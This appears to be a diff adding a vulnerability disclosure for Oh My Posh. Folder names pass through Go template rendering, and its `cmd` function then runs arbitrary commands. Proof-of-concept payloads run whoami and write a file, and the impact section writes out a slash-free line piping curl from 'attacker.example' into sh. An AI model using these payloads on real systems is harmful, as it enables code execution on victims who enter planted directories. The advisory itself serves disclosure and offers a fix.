@@ -1,0 +1,57 @@
+Investigate this using fable as a subagent accoridng to /code-changes 
+
+Summary
+Oh My Posh re-renders the resolved path string, which contains the raw folder names taken from the filesystem, through the Go `text/template` engine. That engine's function map exposes a `cmd` function that runs arbitrary OS commands. A directory whose name contains a Go template expression is therefore evaluated when the prompt renders, giving arbitrary command execution as the current user as soon as the shell is inside (or below) that directory. The built-in default configuration is affected.
+Details
+`src/segments/path.go`, `setStyle()`:
+
+```
+// make sure we resolve all templates
+if txt, err := template.Render(pt.Path, pt); err == nil {
+    pt.Path = txt
+}
+```
+
+`pt.Path` is built from the raw folder-name components of the current working directory (`colorizePath` inserts each folder name verbatim via `fmt.Sprintf(folderFormat, element)`). The whole string is then passed to `template.Render`, which parses and executes it with the full function map from `src/template/func_map.go`, including:
+
+```
+func cmd(command string, args ...string) (string, error) {
+    output, err := env.RunCommand(command, args...)
+    return strings.TrimSpace(output), err
+}
+```
+
+Any template syntax present in an untrusted folder name is evaluated. The render runs after the path-style switch unconditionally, so every path style is affected, and the default config (`src/config/default.go`) contains a path segment.
+PoC
+Config (a single default path segment):
+
+```
+{ "version":3, "blocks":[{"type":"prompt","alignment":"left","segments":[
+  {"type":"path","style":"plain","foreground":"#ffffff",
+   "template":"{{ .Path }}","properties":{"style":"full"}}]}]}
+```
+
+Command execution reflected into the prompt (`--pwd` supplies exactly the string `env.Pwd()` returns for a real directory of that name; on Linux/macOS such a directory is fully creatable, only `/` and NUL are disallowed):
+
+```
+$ oh-my-posh print primary --config p.json --shell fish \
+      --pwd '/home/v/{{ cmd `whoami` }}'
+/home/v/<username>        # whoami executed, output substituted
+
+```
+
+Side effect (file write), slash-free payload, verified on Windows:
+
+```
+$ RCE_OUT=/tmp/proof oh-my-posh print primary --config p.json --shell fish \
+      --pwd '/home/v/{{ cmd `powershell` `-c` `sc $env:RCE_OUT pwn3d` }}'
+$ cat /tmp/proof
+pwn3d
+
+```
+
+Confirmed to fire under full, folder, agnoster, agnoster_short, mixed and letter path styles.
+Impact
+Arbitrary command execution as the victim user, triggered by navigating into attacker-supplied directory content: a subdirectory in a cloned repository, an extracted archive, a network share, or a removable drive. Execution occurs when the shell is in that directory or any descendant (the full path includes the ancestor names) and the prompt renders, i.e. on the next command after cd.
+The path is split on `/` (and `\` on Windows) before rendering, so a payload cannot contain a path separator. This is not a real barrier: on Linux/macOS `{{ cmd `sh` `-c` `curl${IFS}-s${IFS}attacker.example|sh` }}` needs no slash (attacker root path), or a script staged in the same directory can be run with a relative name (`{{ cmd `bash` `x` }}`).
+Suggested fix: do not re-parse the composed path as a template after untrusted folder names have been inserted. Preferably resolve configuration templates (`folder_separator_template`, `mapped_locations`, `folder_format`) individually against their own inputs and concatenate the already-rendered pieces with the literal folder names. Alternatively escape `{{`/`}}` in raw folder-name components before insertion, or use a data-only function map (no `cmd`/`readFile`/`stat`/`glob`) for path resolution. The same double-evaluation pattern is worth reviewing at `src/segments/options/map.go`.
